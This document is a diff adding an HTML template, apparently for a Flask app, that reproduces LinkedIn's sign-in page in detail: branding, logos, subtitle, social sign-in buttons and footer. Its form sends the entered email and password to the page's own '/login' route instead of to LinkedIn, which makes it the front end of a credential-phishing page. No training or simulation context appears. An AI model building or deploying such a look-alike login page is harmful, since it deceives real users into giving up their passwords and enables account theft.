@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LinkedIn Login, Sign in | LinkedIn</title>
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'><path fill='%230a66c2' d='M20.5 2h-17A1.5 1.5 0 002 3.5v17A1.5 1.5 0 003.5 22h17a1.5 1.5 0 001.5-1.5v-17A1.5 1.5 0 0020.5 2zM8 19H5v-9h3zM6.5 8.25A1.75 1.75 0 118.3 6.5a1.78 1.78 0 01-1.8 1.75zM19 19h-3v-4.74c0-1.42-.6-1.93-1.38-1.93A1.74 1.74 0 0013 14.19a.66.66 0 000 .14V19h-3v-9h2.9v1.3a3.11 3.11 0 012.7-1.4c1.55 0 3.36.86 3.36 3.66z'/></svg>">
+    <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
+</head>
+<body>
+    <div class="page-wrapper">
+        <header class="header">
+            <div class="header-container">
+                <a href="/" class="logo-link">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="102" height="28" preserveAspectRatio="xMinYMin meet" focusable="false" class="logo-svg">
+                        <g fill="none" fill-rule="evenodd">
+                            <path class="bug-text-color" d="M0 0h28v28H0z" fill="#0077B5"></path>
+                            <path class="background-color" d="M7.7 23.4V10.2H3.4v13.2h4.3zM5.5 8.3c1.5 0 2.4-1 2.4-2.2C7.9 4.8 7 4 5.6 4 4.1 4 3.1 4.9 3.1 6.1c0 1.2 1 2.2 2.3 2.2h.1zM24 23.4V15.7c0-3.9-2.1-5.8-4.9-5.8-2.3 0-3.3 1.2-3.9 2.1V10.2h-4.3v13.2h4.3v-7.4c0-.4 0-.7.1-1 .3-.7.9-1.5 1.9-1.5 1.4 0 1.9 1 1.9 2.5v7.4H24z" fill="#FFFFFF"></path>
+                        </g>
+                    </svg>
+                </a>
+                <div class="header-actions">
+                    <a href="#" class="join-now-link">Join now</a>
+                    <button class="sign-in-header-btn">Sign in</button>
+                </div>
+            </div>
+        </header>
+
+        <main class="main-content">
+            <div class="login-container">
+                <div class="login-box">
+                    <h1 class="login-title">Sign in</h1>
+                    <p class="login-subtitle">Stay updated on your professional world</p>
+                    
+                    <form action="/login" method="POST" class="login-form">
+                        <div class="input-group">
+                            <label for="username" class="sr-only">Email or Phone</label>
+                            <input 
+                                type="text" 
+                                id="username"
+                                name="email" 
+                                class="text-input"
+                                placeholder="Email or Phone"
+                                required
+                                autocomplete="username"
+                            >
+                        </div>
+                        
+                        <div class="input-group">
+                            <label for="password" class="sr-only">Password</label>
+                            <input 
+                                type="password" 
+                                id="password"
+                                name="password" 
+                                class="text-input"
+                                placeholder="Password"
+                                required
+                                autocomplete="current-password"
+                            >
+                        </div>
+                        
+                        <a href="#" class="forgot-link">Forgot password?</a>
+                        
+                        <button type="submit" class="btn-primary">Sign in</button>
+                    </form>
+                    
+                    <div class="or-divider">
+                        <span class="or-text">or</span>
+                    </div>
+                    
+                    <p class="agreement-text">
+                        By clicking Continue, you agree to LinkedIn's 
+                        <a href="#">User Agreement</a>, 
+                        <a href="#">Privacy Policy</a>, and 
+                        <a href="#">Cookie Policy</a>.
+                    </p>
+                    
+                    <button class="btn-google">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 18 18">
+                            <path fill="#4285F4" d="M17.64 9.2c0-.637-.057-1.251-.164-1.84H9v3.481h4.844c-.209 1.125-.843 2.078-1.796 2.717v2.258h2.908c1.702-1.567 2.684-3.874 2.684-6.615z"/>
+                            <path fill="#34A853" d="M9 18c2.43 0 4.467-.806 5.956-2.184l-2.908-2.258c-.806.54-1.837.86-3.048.86-2.344 0-4.328-1.584-5.036-3.711H.957v2.332C2.438 15.983 5.482 18 9 18z"/>
+                            <path fill="#FBBC05" d="M3.964 10.707c-.18-.54-.282-1.117-.282-1.707s.102-1.167.282-1.707V4.961H.957C.347 6.175 0 7.55 0 9s.348 2.825.957 4.039l3.007-2.332z"/>
+                            <path fill="#EA4335" d="M9 3.58c1.321 0 2.508.454 3.44 1.345l2.582-2.58C13.463.891 11.426 0 9 0 5.482 0 2.438 2.017.957 4.961L3.964 7.29C4.672 5.163 6.656 3.58 9 3.58z"/>
+                        </svg>
+                        <span>Continue with Google</span>
+                    </button>
+                    
+                    <button class="btn-apple">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="16" height="18" viewBox="0 0 16 18" fill="none">
+                            <path d="M11.6237 9.64961C11.6372 10.9613 12.2255 12.1466 13.1492 13.0031C13.5863 13.3958 14.0961 13.6925 14.6447 13.893C14.3881 14.6582 14.0452 15.3785 13.6203 16.0448C13.0348 16.9544 12.4179 17.8595 11.3949 17.8775C10.9055 17.8865 10.5356 17.7534 10.1522 17.6158C9.75049 17.4737 9.33215 17.3261 8.72085 17.3261C8.07793 17.3261 7.63721 17.4782 7.21348 17.6248C6.84776 17.7534 6.49402 17.8775 6.0496 17.8955C5.05796 17.9316 4.34809 16.944 3.75812 16.0358C2.55322 14.1844 1.61891 10.7658 2.85534 8.46347C3.46665 7.31885 4.55895 6.59115 5.75483 6.57313C6.27524 6.56411 6.77361 6.74123 7.21799 6.89633C7.60421 7.03187 7.95346 7.15389 8.24733 7.15389C8.50913 7.15389 8.88386 7.01835 9.30759 6.86325C9.87322 6.65407 10.5627 6.40131 11.2431 6.46339C11.6462 6.48591 12.6737 6.60794 13.4294 7.42578C12.2389 8.22565 12.0971 9.64961 11.6237 9.64961V9.64961ZM9.60166 4.18037C9.96739 3.71955 10.5672 3.24071 11.1676 3.28175C11.2341 3.88796 10.9731 4.50318 10.5941 4.97751C10.2196 5.45184 9.66503 5.90366 9.02665 5.87165C8.94764 5.27444 9.23149 4.64121 9.60166 4.18037Z" fill="black"/>
+                        </svg>
+                        <span>Sign in with Apple</span>
+                    </button>
+                </div>
+                
+                <div class="join-box">
+                    New to LinkedIn? <a href="#" class="join-link">Join now</a>
+                </div>
+            </div>
+        </main>
+
+        <footer class="footer">
+            <div class="footer-container">
+                <div class="footer-logo">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="56" height="14" preserveAspectRatio="xMinYMin meet" focusable="false">
+                        <g fill="none" fill-rule="evenodd">
+                            <path class="bug-text-color" d="M0 0h14v14H0z" fill="#0077B5"></path>
+                            <path class="background-color" d="M3.85 11.7V5.1H1.7v6.6h2.15zM2.75 4.15c.75 0 1.2-.5 1.2-1.1-.015-.6-.45-1.1-1.185-1.1C2.1 1.95 1.65 2.45 1.65 3.05c0 .6.45 1.1 1.15 1.1h.0zM12 11.7V7.85c0-1.95-1.05-2.9-2.45-2.9-1.15 0-1.65.6-1.95 1.05V5.1H5.45v6.6h2.15V7.85c0-.2 0-.35.05-.5.15-.35.45-.75.95-.75.7 0 .95.5.95 1.25v3.7H12z" fill="#FFFFFF"></path>
+                        </g>
+                    </svg>
+                </div>
+                
+                <nav class="footer-nav">
+                    <ul class="footer-links">
+                        <li><a href="#">User Agreement</a></li>
+                        <li><a href="#">Privacy Policy</a></li>
+                        <li><a href="#">Community Guidelines</a></li>
+                        <li><a href="#">Cookie Policy</a></li>
+                        <li><a href="#">Copyright Policy</a></li>
+                        <li><a href="#">Send Feedback</a></li>
+                        <li>
+                            <select class="language-dropdown">
+                                <option>Language</option>
+                                <option value="en">English (English)</option>
+                                <option value="ar">العربية (Arabic)</option>
+                                <option value="cs">Čeština (Czech)</option>
+                                <option value="da">Dansk (Danish)</option>
+                                <option value="de">Deutsch (German)</option>
+                                <option value="es">Español (Spanish)</option>
+                                <option value="fr">Français (French)</option>
+                                <option value="hi">हिंदी (Hindi)</option>
+                                <option value="id">Bahasa Indonesia (Indonesian)</option>
+                                <option value="it">Italiano (Italian)</option>
+                                <option value="ja">日本語 (Japanese)</option>
+                                <option value="ko">한국어 (Korean)</option>
+                            </select>
+                        </li>
+                    </ul>
+                </nav>
+                
+                <div class="footer-copyright">
+                    LinkedIn Corporation © 2025
+                </div>
+            </div>
+        </footer>
+    </div>
+</body>
+</html>
